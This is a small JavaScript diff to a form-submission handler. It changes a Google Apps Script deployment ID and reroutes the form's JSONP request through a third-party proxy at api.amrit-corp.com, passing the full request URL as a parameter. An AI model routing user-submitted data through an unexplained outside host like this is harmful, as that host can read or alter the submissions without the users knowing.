@@ -209,7 +209,7 @@ cridtwo.addEventListener("submit", (event) => {
   var time = $("#dateQ").val();
   var url1 = "https://script.google.com/macros/s/";
   var url2 =
-    "AKfycbxYC7rpKpnZmgpNVsmgoCu-Wi9Bt604MjkH9LaH0Gd9LA5QLtH1bjgUfvRlQGyIKCiQ";
+    "AKfycbyjZr_GlLG5IEBabVp79cQHSwIDovEoZc5KHEBFI2vpI5cb2H14qkqkdPI-quXuIKtn";
   var url3 = url1 + url2 + "/exec";
   if (
     name != 0 &&
@@ -246,7 +246,9 @@ cridtwo.addEventListener("submit", (event) => {
       "&action=gentestin";
     var request = jQuery.ajax({
       crossDomain: true,
-      url: url,
+      url:
+        "https://api.amrit-corp.com/_header/gate/mastrowall/?target_url=" +
+        encodeURIComponent(url),
       method: "GET",
       dataType: "jsonp",
     });
